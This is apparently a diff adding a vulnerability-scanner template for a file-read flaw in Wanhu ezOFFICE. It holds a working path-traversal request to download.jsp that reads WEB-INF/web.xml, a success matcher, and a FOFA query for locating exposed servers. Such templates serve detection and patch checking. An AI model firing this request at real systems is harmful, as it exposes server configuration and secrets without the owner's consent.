@@ -1,0 +1,28 @@
+http:
+    - cookie-reuse: true
+      matchers:
+        - dsl:
+            - status_code == 200 && contains_all(body_2, 'web-app','</web-app>')
+          type: dsl
+      raw:
+        - |
+          GET /defaultroot/login.jsp HTTP/1.1
+          Host: {{Hostname}}
+        - |
+          GET /defaultroot/public/iWebOfficeSign/download.jsp;?path=..&name=web.xml&FileName=WEB-INF/web.xml HTTP/1.1
+          Host: {{Hostname}}
+id: wanhu-ezoffice-download-fileread
+info:
+    author: monster
+    metadata:
+        fofa-query: app="万户网络-ezOFFICE"
+        max-request: 1
+        verified: true
+    name: 万户OA download接口文件读取漏洞
+    severity: medium
+    tags:
+        - wanhu
+        - ezoffice
+        - fileread
+        - 万户oa
+        - 万户网络-ezOFFICE
